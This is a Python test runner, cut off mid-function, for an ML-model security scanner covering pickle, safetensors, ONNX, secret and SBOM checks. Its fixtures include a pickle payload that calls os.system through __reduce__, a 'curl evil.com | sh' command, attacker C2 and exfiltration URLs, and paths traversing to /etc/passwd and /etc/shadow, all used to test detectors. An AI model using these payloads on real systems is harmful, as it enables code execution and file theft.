"""Полный test runner без pytest."""
import sys, os, traceback, tempfile, pickle, zipfile, json, time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent / "ml-guard"))

from ml_guard.findings import Severity, Finding
from ml_guard.scanners.pickle_scanner import PickleScanner
from ml_guard.runner import Runner, ScanResult
from ml_guard.output import format_text, format_json, format_sarif


class _Mal:
    def __reduce__(self):
        import os
        return (os.system, ("echo x",))

def evil_pkl(p):
    with open(p, "wb") as f:
        pickle.dump(_Mal(), f)
    return Path(p)

def clean_pkl(p):
    with open(p, "wb") as f:
        pickle.dump({"a": 1}, f)
    return Path(p)


RESULTS = []
def t(name, fn):
    try:
        fn()
        RESULTS.append((name, "PASS"))
        print(f"  ✓ {name}")
    except AssertionError as e:
        RESULTS.append((name, "FAIL"))
        print(f"  ✗ {name}: {e}")
    except Exception:
        RESULTS.append((name, "ERROR"))
        print(f"  ✗ {name}\n{traceback.format_exc()}")


def section(title, fn):
    print(f"\n=== {title} ===\n")
    fn()


# ============ pickle scanner ============
def pickle_tests():
    s = PickleScanner()
    with tempfile.TemporaryDirectory() as td:
        d = Path(td)

        def benign_clean():
            findings = s.scan(clean_pkl(d / "c.pkl"))
            assert not any(f.severity == Severity.CRITICAL for f in findings)

        def detects_os():
            findings = s.scan(evil_pkl(d / "e.pkl"))
            assert any(f.severity == Severity.CRITICAL for f in findings)

        def torch_zip():
            p = d / "model.pt"
            inner = pickle.dumps(_Mal())
            with zipfile.ZipFile(p, "w") as zf:
                zf.writestr("archive/data.pkl", inner)
                zf.writestr("archive/version", "3\n")
            findings = s.scan(p)
            assert any(f.severity == Severity.CRITICAL for f in findings)
            assert any("data.pkl" in f.location for f in findings if f.severity == Severity.CRITICAL)

        def corrupt():
            p = d / "corrupt.pkl"
            p.write_bytes(b"\x80\x04\x95\xff\xff\xffJUNK")
            findings = s.scan(p)
            assert any(f.rule_id == "pickle-parse-error" for f in findings)

        t("pickle/benign_clean", benign_clean)
        t("pickle/detects_os", detects_os)
        t("pickle/torch_zip", torch_zip)
        t("pickle/corrupt_no_crash", corrupt)


# ============ runner ============
def runner_tests():
    def empty():
        with tempfile.TemporaryDirectory() as td:
            r = Runner().run(Path(td))
            assert r.files_scanned == 0
            assert r.findings == []

    def single_clean_file():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "a.pkl"
            clean_pkl(p)
            r = Runner().run(p)
            assert r.files_scanned == 1
            assert not r.has_at_least(Severity.CRITICAL)

    def single_evil_file():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "b.pkl"
            evil_pkl(p)
            r = Runner().run(p)
            assert r.has_at_least(Severity.CRITICAL)

    def dir_recursion():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            sub = root / "models" / "v1"
            sub.mkdir(parents=True)
            clean_pkl(sub / "good.pkl")
            evil_pkl(sub / "bad.pkl")
            r = Runner().run(root)
            assert r.files_scanned == 2, f"got {r.files_scanned}"
            assert r.has_at_least(Severity.CRITICAL)

    def ignore_git():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            git = root / ".git"
            git.mkdir()
            evil_pkl(git / "evil.pkl")
            r = Runner().run(root)
            assert r.files_scanned == 0, f"shouldn't scan .git, got {r.files_scanned}"

    def nonexistent():
        r = Runner().run(Path("/nonexistent/zzz"))
        assert r.errors
        assert r.files_scanned == 0

    def summary_counts():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "a.pkl")
            evil_pkl(root / "b.pkl")
            clean_pkl(root / "c.pkl")
            r = Runner().run(root)
            assert r.summary_counts()["critical"] >= 2

    t("runner/empty_dir", empty)
    t("runner/single_clean", single_clean_file)
    t("runner/single_evil", single_evil_file)
    t("runner/dir_recursion", dir_recursion)
    t("runner/ignore_git", ignore_git)
    t("runner/nonexistent_path", nonexistent)
    t("runner/summary_counts", summary_counts)


# ============ formatters ============
def formatter_tests():
    with tempfile.TemporaryDirectory() as td:
        d = Path(td)
        evil_pkl(d / "evil.pkl")
        result = Runner().run(d)

        def text_fmt():
            out = format_text(result, use_color=False)
            assert "ML Guard" in out
            assert "CRITICAL" in out
            assert "evil.pkl" in out

        def json_fmt():
            out = format_json(result)
            data = json.loads(out)
            assert data["tool"] == "ml-guard"
            assert data["summary"]["critical"] >= 1
            assert len(data["findings"]) >= 1

        def sarif_fmt():
            out = format_sarif(result)
            data = json.loads(out)
            assert data["version"] == "2.1.0"
            assert data["runs"][0]["tool"]["driver"]["name"] == "ml-guard"
            assert len(data["runs"][0]["results"]) >= 1
            r0 = data["runs"][0]["results"][0]
            assert r0["level"] == "error"
            assert "primary" in r0["partialFingerprints"]

        def empty_result_text():
            empty = ScanResult()
            out = format_text(empty, use_color=False)
            assert "no findings" in out.lower() or "all clear" in out.lower()

        t("fmt/text", text_fmt)
        t("fmt/json", json_fmt)
        t("fmt/sarif", sarif_fmt)
        t("fmt/empty_text", empty_result_text)


section("Pickle scanner", pickle_tests)
section("Runner", runner_tests)
section("Formatters", formatter_tests)


# ============ safetensors ============
def safetensors_tests():
    import struct as _struct
    from ml_guard.scanners.safetensors_scanner import SafetensorsScanner

    def _build(header_obj, body=b""):
        head = json.dumps(header_obj).encode("utf-8")
        return _struct.pack("<Q", len(head)) + head + body

    def _has(findings, rule):
        return any(f.rule_id == rule for f in findings)

    s = SafetensorsScanner()

    def can_scan_ext():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "x.safetensors"; p.write_bytes(b"")
            assert s.can_scan(p)
            other = Path(td) / "x.bin"; other.write_bytes(b"")
            assert not s.can_scan(other)

    def clean():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "ok.safetensors"
            p.write_bytes(_build({
                "w": {"dtype": "F32", "shape": [2, 3], "data_offsets": [0, 24]},
                "__metadata__": {"format": "pt"},
            }, b"\x00" * 24))
            assert s.scan(p) == []

    def too_short():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "tiny.safetensors"
            p.write_bytes(b"\x00\x00")
            assert _has(s.scan(p), "safetensors-malformed-header")

    def header_too_big():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "lying.safetensors"
            p.write_bytes(_struct.pack("<Q", 999_999) + b"{}")
            assert _has(s.scan(p), "safetensors-malformed-header")

    def bad_json():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "bad.safetensors"
            bad = b"{not json"
            p.write_bytes(_struct.pack("<Q", len(bad)) + bad)
            assert _has(s.scan(p), "safetensors-malformed-header")

    def out_of_bounds():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "oob.safetensors"
            p.write_bytes(_build(
                {"w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 1000]}},
                b"\x00" * 4,
            ))
            assert _has(s.scan(p), "safetensors-out-of-bounds")

    def size_mismatch():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "mis.safetensors"
            p.write_bytes(_build(
                {"w": {"dtype": "F32", "shape": [2, 3], "data_offsets": [0, 16]}},
                b"\x00" * 16,
            ))
            assert _has(s.scan(p), "safetensors-size-mismatch")

    def unknown_dtype():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "dt.safetensors"
            p.write_bytes(_build(
                {"w": {"dtype": "F999", "shape": [2], "data_offsets": [0, 8]}},
                b"\x00" * 8,
            ))
            assert _has(s.scan(p), "safetensors-unknown-dtype")

    def overlapping():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "ovl.safetensors"
            p.write_bytes(_build(
                {
                    "a": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
                    "b": {"dtype": "F32", "shape": [4], "data_offsets": [8, 24]},
                },
                b"\x00" * 32,
            ))
            assert _has(s.scan(p), "safetensors-overlapping-tensors")

    def trailing_elf():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "elf.safetensors"
            body = b"\x00" * 16 + b"\x7fELF" + b"\x00" * 100
            p.write_bytes(_build(
                {"w": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]}},
                body,
            ))
            findings = s.scan(p)
            assert _has(findings, "safetensors-executable-trailing")
            assert any(f.severity == Severity.CRITICAL for f in findings)

    def trailing_random():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "tr.safetensors"
            body = b"\x00" * 16 + b"random_payload_here_" * 20
            p.write_bytes(_build(
                {"w": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]}},
                body,
            ))
            findings = s.scan(p)
            assert _has(findings, "safetensors-hidden-data")
            assert not _has(findings, "safetensors-executable-trailing")

    def metadata_url():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "meta.safetensors"
            p.write_bytes(_build({
                "w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
                "__metadata__": {"hint": "send to http://evil.example.com/exfil"},
            }, b"\x00" * 4))
            assert _has(s.scan(p), "safetensors-metadata-url")

    def metadata_ip():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "ip.safetensors"
            p.write_bytes(_build({
                "w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
                "__metadata__": {"server": "8.8.8.8"},
            }, b"\x00" * 4))
            assert _has(s.scan(p), "safetensors-metadata-ip")

    def metadata_localhost_ignored():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "lo.safetensors"
            p.write_bytes(_build({
                "w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
                "__metadata__": {"server": "127.0.0.1"},
            }, b"\x00" * 4))
            assert not _has(s.scan(p), "safetensors-metadata-ip")

    def padding_ignored():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "pad.safetensors"
            body = b"\x00" * 16 + b"\x00" * 32
            p.write_bytes(_build(
                {"w": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]}},
                body,
            ))
            findings = s.scan(p)
            assert not _has(findings, "safetensors-hidden-data")

    t("safetensors/can_scan_ext", can_scan_ext)
    t("safetensors/clean_no_findings", clean)
    t("safetensors/too_short", too_short)
    t("safetensors/header_too_big", header_too_big)
    t("safetensors/bad_json", bad_json)
    t("safetensors/out_of_bounds", out_of_bounds)
    t("safetensors/size_mismatch", size_mismatch)
    t("safetensors/unknown_dtype", unknown_dtype)
    t("safetensors/overlapping", overlapping)
    t("safetensors/trailing_elf_critical", trailing_elf)
    t("safetensors/trailing_random_medium", trailing_random)
    t("safetensors/metadata_url", metadata_url)
    t("safetensors/metadata_ip", metadata_ip)
    t("safetensors/metadata_localhost_ignored", metadata_localhost_ignored)
    t("safetensors/padding_ignored", padding_ignored)


section("Safetensors scanner", safetensors_tests)


# ============ secrets ============
def secret_tests():
    from ml_guard.scanners.secret_scanner import SecretScanner

    s = SecretScanner()

    def _has(findings, rule_id):
        return any(f.rule_id == rule_id for f in findings)

    def detects_aws_access_key():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "config.yml"
            # 20-символьный AKIA-формат; не AWS doc example, не содержит EXAMPLE.
            p.write_text("aws_access_key_id: AKIAQ7BCDEFGHIJKLMNO\n")
            f = s.scan(p)
            assert _has(f, "secret-aws-access-key"), [x.to_dict() for x in f]

    def detects_github_pat():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "deploy.sh"
            p.write_text("export GH_TOKEN=ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789\n")
            f = s.scan(p)
            assert _has(f, "secret-github-pat")

    def detects_openai_key():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / ".env"
            p.write_text("OPENAI_API_KEY=sk-proj-aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCd\n")
            f = s.scan(p)
            assert _has(f, "secret-openai-key")

    def detects_anthropic_key():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / ".env"
            p.write_text("ANTHROPIC_API_KEY=sk-ant-AbCdEfGhIjKlMnOpQrStUvWx\n")
            f = s.scan(p)
            assert _has(f, "secret-anthropic-key")

    def detects_huggingface_token():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "train.py"
            p.write_text("HF_TOKEN = 'hf_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789'\n")
            f = s.scan(p)
            assert _has(f, "secret-huggingface-token")

    def detects_private_key():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "id_rsa.py"  # extension matters; we scan .py
            p.write_text(
                'KEY = """-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n"""\n'
            )
            f = s.scan(p)
            assert _has(f, "secret-private-key")

    def detects_jwt():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "demo.json"
            p.write_text(
                '{"token": "eyJhbGciOiJIUzI1NiJ9.'
                'eyJ1c2VySWQiOjEyMzQ1Njc4OTB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk"}\n'
            )
            f = s.scan(p)
            assert _has(f, "secret-jwt")

    def detects_high_entropy():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "x.yml"
            # Длинная случайная base64-like строка рядом с ключом 'secret'
            p.write_text("api_secret: aB3xYz9KqL2mN8pR5tV7wX4cZ1bN6dM\n")
            f = s.scan(p)
            assert _has(f, "secret-high-entropy"), [x.to_dict() for x in f]

    def ignores_uuid():
        """UUID — это идентификатор, а не секрет, даже если рядом 'secret'."""
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "x.yml"
            p.write_text("session_secret: 550e8400-e29b-41d4-a716-446655440000\n")
            f = s.scan(p)
            assert not _has(f, "secret-high-entropy")

    def ignores_placeholders():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / ".env"
            p.write_text(
                "OPENAI_API_KEY=your_secret_key_here\n"
                "AWS_ACCESS_KEY=AKIAEXAMPLEEXAMPLEEX\n"
            )
            f = s.scan(p)
            # Real AKIA-паттерн пройдёт; placeholder с EXAMPLE тоже AKIA-формы → должен подсветиться,
            # но мы фильтруем строку с EXAMPLE через _is_obviously_placeholder.
            # Проверяем: не должно быть aws_secret_near_key (нет такого префикса)
            # и для openai placeholder — мы должны его пропустить.
            for x in f:
                assert "your_secret_key_here" not in x.snippet

    def ipynb_cell_source():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "demo.ipynb"
            nb = {
                "cells": [
                    {
                        "cell_type": "code",
                        "source": [
                            "import os\n",
                            "key = 'AKIAQ7BCDEFGHIJKLMNO'\n",
                        ],
                        "outputs": [],
                    }
                ],
                "metadata": {},
                "nbformat": 4,
                "nbformat_minor": 5,
            }
            p.write_text(json.dumps(nb))
            f = s.scan(p)
            assert _has(f, "secret-aws-access-key")
            # location должен указать на cell
            assert any("cell 0" in x.location for x in f)

    def secret_is_redacted():
        """Полный секрет НЕ должен попадать в snippet."""
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "x.env"
            secret = "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"
            p.write_text(f"GH_TOKEN={secret}\n")
            f = s.scan(p)
            for x in f:
                if x.rule_id == "secret-github-pat":
                    assert secret not in x.snippet
                    assert "…" in x.snippet

    def line_number_correct():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "x.env"
            p.write_text(
                "FOO=bar\n"
                "BAZ=qux\n"
                "GH_TOKEN=ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789\n"
            )
            f = s.scan(p)
            tok = [x for x in f if x.rule_id == "secret-github-pat"]
            assert tok and tok[0].location == "line 3"

    def file_too_large():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "huge.env"
            # Ставим лимит ниже
            old_limit = SecretScanner.MAX_FILE_BYTES
            try:
                SecretScanner.MAX_FILE_BYTES = 100
                p.write_text("X=" + "a" * 200)
                f = s.scan(p)
                assert _has(f, "secrets-file-too-large")
            finally:
                SecretScanner.MAX_FILE_BYTES = old_limit

    def can_scan_filtering():
        with tempfile.TemporaryDirectory() as td:
            for name, expected in [
                (".env", True),
                ("config.yaml", True),
                ("x.json", True),
                ("Dockerfile", True),
                ("model.pkl", False),     # бинарный — не наш
                ("README.md", False),     # md не сканируем (выбор)
                ("notebook.ipynb", True),
            ]:
                p = Path(td) / name
                p.write_text("dummy")
                got = s.can_scan(p)
                assert got == expected, f"{name}: expected {expected} got {got}"

    t("secrets/aws_access_key", detects_aws_access_key)
    t("secrets/github_pat", detects_github_pat)
    t("secrets/openai_key", detects_openai_key)
    t("secrets/anthropic_key", detects_anthropic_key)
    t("secrets/huggingface_token", detects_huggingface_token)
    t("secrets/private_key", detects_private_key)
    t("secrets/jwt", detects_jwt)
    t("secrets/high_entropy", detects_high_entropy)
    t("secrets/uuid_ignored", ignores_uuid)
    t("secrets/placeholders_ignored", ignores_placeholders)
    t("secrets/ipynb_cell", ipynb_cell_source)
    t("secrets/redaction", secret_is_redacted)
    t("secrets/line_number", line_number_correct)
    t("secrets/file_too_large", file_too_large)
    t("secrets/can_scan_filtering", can_scan_filtering)


section("Secret scanner", secret_tests)


# ============ onnx ============
def onnx_tests():
    from ml_guard.scanners.onnx_scanner import OnnxScanner

    def varint(n):
        out = bytearray()
        while n > 0x7f:
            out.append((n & 0x7f) | 0x80); n >>= 7
        out.append(n & 0x7f)
        return bytes(out)

    def string_field(no, s):
        payload = s.encode('utf-8') if isinstance(s, str) else s
        return varint((no << 3) | 2) + varint(len(payload)) + payload

    def int_field(no, v):
        return varint((no << 3) | 0) + varint(v)

    def submsg_field(no, blob):
        return varint((no << 3) | 2) + varint(len(blob)) + blob

    def build_attr(name, str_value=None):
        """AttributeProto: name + s (bytes) + type=STRING."""
        out = string_field(1, name) + int_field(20, 3)  # type=STRING
        if str_value is not None:
            out += string_field(4, str_value)  # s
        return out

    def build_node(op_type, domain="", attrs=None):
        out = string_field(4, op_type)
        if domain:
            out += string_field(7, domain)
        if attrs:
            for a in attrs:
                out += submsg_field(5, a)
        return out

    def build_opset(domain, version):
        return string_field(1, domain) + int_field(2, version)

    def build_kv(k, v):
        """StringStringEntryProto: key=k, value=v."""
        return string_field(1, k) + string_field(2, v)

    def build_initializer(name, external_loc=None, data_location_external=False):
        out = string_field(8, name)
        if external_loc is not None:
            kv = build_kv("location", external_loc)
            out += submsg_field(13, kv)
        if data_location_external:
            out += int_field(14, 1)
        return out

    def build_graph(nodes=None, initializers=None):
        out = b""
        for n in nodes or []:
            out += submsg_field(1, n)
        for ini in initializers or []:
            out += submsg_field(5, ini)
        return out

    def build_model(*, ir_version=8, opsets=None, graph=None, metadata=None,
                    producer="ml-guard-test"):
        out = int_field(1, ir_version) + string_field(5, producer)
        for op in opsets or []:
            out += submsg_field(8, op)
        if graph is not None:
            out += submsg_field(7, graph)
        for kv in metadata or []:
            out += submsg_field(14, kv)
        return out

    s = OnnxScanner()

    def _has(findings, rule):
        return any(f.rule_id == rule for f in findings)

    # --- собственно тесты ---

    def can_scan_ext():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "x.onnx"; p.write_bytes(b"")
            assert s.can_scan(p)
            other = Path(td) / "x.bin"; other.write_bytes(b"")
            assert not s.can_scan(other)

    def empty_file():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "x.onnx"; p.write_bytes(b"")
            f = s.scan(p)
            assert _has(f, "onnx-empty")

    def malformed_file():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "x.onnx"
            p.write_bytes(b"\xff\xff\xff\xff\xffJUNK")
            f = s.scan(p)
            assert _has(f, "onnx-malformed")

    def clean_standard_op():
        """Стандартный домен + опсет 13 — должно быть чисто."""
        with tempfile.TemporaryDirectory() as td:
            opset = build_opset("", 13)
            node = build_node("Conv", domain="")
            graph = build_graph(nodes=[node])
            data = build_model(opsets=[opset], graph=graph)
            p = Path(td) / "ok.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert f == [], [x.to_dict() for x in f]

    def custom_domain_high():
        with tempfile.TemporaryDirectory() as td:
            opset = build_opset("evil.exfil", 1)
            node = build_node("Eval", domain="evil.exfil")
            graph = build_graph(nodes=[node])
            data = build_model(opsets=[opset], graph=graph)
            p = Path(td) / "evil.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-custom-domain-op")
            assert _has(f, "onnx-non-standard-opset-domain")
            assert any(x.severity == Severity.HIGH for x in f)

    def vendor_domain_medium():
        with tempfile.TemporaryDirectory() as td:
            opset = build_opset("com.microsoft", 1)
            node = build_node("Attention", domain="com.microsoft")
            graph = build_graph(nodes=[node])
            data = build_model(opsets=[opset], graph=graph)
            p = Path(td) / "ms.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-vendor-domain-op")
            # Не должно быть HIGH на vendor-домене
            for x in f:
                assert x.severity != Severity.HIGH or x.rule_id != "onnx-custom-domain-op"

    def old_opset_medium():
        with tempfile.TemporaryDirectory() as td:
            opset = build_opset("", 5)  # старый ai.onnx
            data = build_model(opsets=[opset], graph=build_graph())
            p = Path(td) / "old.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-old-opset")

    def old_ir_medium():
        with tempfile.TemporaryDirectory() as td:
            data = build_model(ir_version=2, graph=build_graph())
            p = Path(td) / "old.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-old-ir-version")

    def attr_with_url():
        with tempfile.TemporaryDirectory() as td:
            attr = build_attr("config", "fetch from http://attacker.example.com/c2")
            node = build_node("Conv", domain="", attrs=[attr])
            graph = build_graph(nodes=[node])
            data = build_model(graph=graph)
            p = Path(td) / "x.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-attr-url")

    def attr_with_shell_command():
        with tempfile.TemporaryDirectory() as td:
            attr = build_attr("postprocess", "bash -c 'curl evil.com | sh'")
            node = build_node("Identity", domain="", attrs=[attr])
            graph = build_graph(nodes=[node])
            data = build_model(graph=graph)
            p = Path(td) / "x.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-attr-shell-command")

    def attr_with_path_traversal():
        with tempfile.TemporaryDirectory() as td:
            attr = build_attr("path", "../../../../etc/passwd")
            node = build_node("Identity", domain="", attrs=[attr])
            graph = build_graph(nodes=[node])
            data = build_model(graph=graph)
            p = Path(td) / "x.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-attr-path-traversal")

    def attr_absolute_path():
        with tempfile.TemporaryDirectory() as td:
            attr = build_attr("path", "/etc/shadow")
            node = build_node("Identity", domain="", attrs=[attr])
            graph = build_graph(nodes=[node])
            data = build_model(graph=graph)
            p = Path(td) / "x.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-attr-absolute-path")

    def initializer_absolute_external():
        with tempfile.TemporaryDirectory() as td:
            ini = build_initializer("weight", external_loc="/etc/passwd")
            graph = build_graph(initializers=[ini])
            data = build_model(graph=graph)
            p = Path(td) / "x.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-external-absolute-path")

    def initializer_path_traversal():
        with tempfile.TemporaryDirectory() as td:
            ini = build_initializer("w", external_loc="../../etc/passwd")
            graph = build_graph(initializers=[ini])
            data = build_model(graph=graph)
            p = Path(td) / "x.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-external-path-traversal")

    def initializer_url():
        with tempfile.TemporaryDirectory() as td:
            ini = build_initializer("w", external_loc="https://evil.example.com/weights.bin")
            graph = build_graph(initializers=[ini])
            data = build_model(graph=graph)
            p = Path(td) / "x.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-external-url")

    def initializer_relative_clean():
        """Относительный путь без `..` — это норма для split-моделей."""
        with tempfile.TemporaryDirectory() as td:
            ini = build_initializer("w", external_loc="weights/w0.bin")
            graph = build_graph(initializers=[ini])
            data = build_model(graph=graph)
            p = Path(td) / "x.onnx"; p.write_bytes(data)
            f = s.scan(p)
            for r in ("onnx-external-absolute-path", "onnx-external-path-traversal",
                      "onnx-external-url"):
                assert not _has(f, r), f"unexpected {r}"

    def metadata_url():
        with tempfile.TemporaryDirectory() as td:
            meta = build_kv("source", "https://huggingface.co/example/model")
            data = build_model(graph=build_graph(), metadata=[meta])
            p = Path(td) / "x.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert _has(f, "onnx-metadata-url")

    def deduplicated_custom_op_pair():
        """Два узла с одинаковой парой (domain, op_type) → один finding."""
        with tempfile.TemporaryDirectory() as td:
            opset = build_opset("evil.exfil", 1)
            n1 = build_node("Bad", domain="evil.exfil")
            n2 = build_node("Bad", domain="evil.exfil")
            graph = build_graph(nodes=[n1, n2])
            data = build_model(opsets=[opset], graph=graph)
            p = Path(td) / "x.onnx"; p.write_bytes(data)
            f = s.scan(p)
            assert sum(1 for x in f if x.rule_id == "onnx-custom-domain-op") == 1

    t("onnx/can_scan_ext", can_scan_ext)
    t("onnx/empty_file", empty_file)
    t("onnx/malformed", malformed_file)
    t("onnx/clean_standard_op", clean_standard_op)
    t("onnx/custom_domain_high", custom_domain_high)
    t("onnx/vendor_domain_medium", vendor_domain_medium)
    t("onnx/old_opset_medium", old_opset_medium)
    t("onnx/old_ir_medium", old_ir_medium)
    t("onnx/attr_url", attr_with_url)
    t("onnx/attr_shell_command", attr_with_shell_command)
    t("onnx/attr_path_traversal", attr_with_path_traversal)
    t("onnx/attr_absolute_path", attr_absolute_path)
    t("onnx/initializer_absolute_external", initializer_absolute_external)
    t("onnx/initializer_path_traversal", initializer_path_traversal)
    t("onnx/initializer_url", initializer_url)
    t("onnx/initializer_relative_clean", initializer_relative_clean)
    t("onnx/metadata_url", metadata_url)
    t("onnx/deduplicated_custom_op_pair", deduplicated_custom_op_pair)


section("ONNX scanner", onnx_tests)


# ============ SBOM ============
def sbom_tests():
    from ml_guard.sbom import build_sbom, build_sbom_json
    from ml_guard.runner import ScanResult
    from ml_guard.findings import Finding

    def basic_structure():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "model.pkl")
            (root / "requirements.txt").write_text(
                "transformers==4.30.0\n"
                "# comment\n"
                "torch>=2.0.1\n"
                "\n"
            )
            result = Runner().run(root)
            bom = build_sbom(result, root)
            # CycloneDX обязательные поля
            assert bom["bomFormat"] == "CycloneDX"
            assert bom["specVersion"] == "1.5"
            assert bom["serialNumber"].startswith("urn:uuid:")
            assert bom["metadata"]["tools"]["components"][0]["name"] == "ml-guard"
            # Должен быть компонент model.pkl
            comp_names = [c["name"] for c in bom["components"]]
            assert "model.pkl" in comp_names
            # Зависимости из requirements.txt
            assert "transformers" in comp_names
            assert "torch" in comp_names
            # У model.pkl — sha256
            mp = next(c for c in bom["components"] if c["name"] == "model.pkl")
            assert any(h["alg"] == "SHA-256" for h in mp.get("hashes", []))
            # Vulnerability присутствует, ratings заполнены
            assert bom["vulnerabilities"]
            v0 = bom["vulnerabilities"][0]
            assert v0["ratings"][0]["severity"] in ("critical", "high", "medium", "low", "info")
            assert v0["affects"][0]["ref"]

    def min_severity_filters():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "model.pkl")
            result = Runner().run(root)
            # При min_severity=critical — vuln есть (critical)
            bom_c = build_sbom(result, root, min_severity=Severity.CRITICAL)
            assert bom_c["vulnerabilities"]
            # При min_severity=info — все включены
            bom_i = build_sbom(result, root, min_severity=Severity.INFO)
            assert len(bom_i["vulnerabilities"]) >= len(bom_c["vulnerabilities"])

    def no_deps_flag():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "requirements.txt").write_text("transformers==4.30.0\n")
            result = Runner().run(root)
            bom = build_sbom(result, root, include_dependencies=False)
            comp_names = [c["name"] for c in bom["components"]]
            assert "transformers" not in comp_names

    def empty_scan_yields_valid_bom():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            result = ScanResult()
            bom = build_sbom(result, root)
            assert bom["bomFormat"] == "CycloneDX"
            assert bom["components"] == []
            assert bom["vulnerabilities"] == []
            # Должно быть валидным JSON
            json.loads(json.dumps(bom))

    def covers_safetensors_and_onnx():
        """ML-артефакты должны попадать в BOM даже без findings."""
        import struct as _struct
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            # Чистый safetensors — без findings
            head = json.dumps({
                "w": {"dtype": "F32", "shape": [2, 3], "data_offsets": [0, 24]},
            }).encode()
            (root / "ok.safetensors").write_bytes(
                _struct.pack("<Q", len(head)) + head + b"\x00" * 24
            )
            result = Runner().run(root)
            bom = build_sbom(result, root)
            comp_names = [c["name"] for c in bom["components"]]
            assert "ok.safetensors" in comp_names
            ok = next(c for c in bom["components"] if c["name"] == "ok.safetensors")
            assert ok["type"] == "machine-learning-model"

    def stable_sha256():
        """Один и тот же файл — одинаковый SHA-256 в двух BOM'ах."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "x.pkl").write_bytes(b"\x80\x04N." + b"deterministic" * 100)
            r = Runner().run(root)
            bom1 = build_sbom(r, root)
            bom2 = build_sbom(r, root)
            x1 = next(c for c in bom1["components"] if c["name"] == "x.pkl")
            x2 = next(c for c in bom2["components"] if c["name"] == "x.pkl")
            assert x1["hashes"] == x2["hashes"]
            # Но serialNumber должен быть РАЗНЫМ — это новый BOM
            assert bom1["serialNumber"] != bom2["serialNumber"]

    def json_output_is_valid():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            r = Runner().run(root)
            text = build_sbom_json(r, root)
            parsed = json.loads(text)
            assert parsed["bomFormat"] == "CycloneDX"

    def vulnerability_properties_complete():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            r = Runner().run(root)
            bom = build_sbom(r, root, min_severity=Severity.LOW)
            assert bom["vulnerabilities"]
            v = bom["vulnerabilities"][0]
            prop_names = {p["name"] for p in v["properties"]}
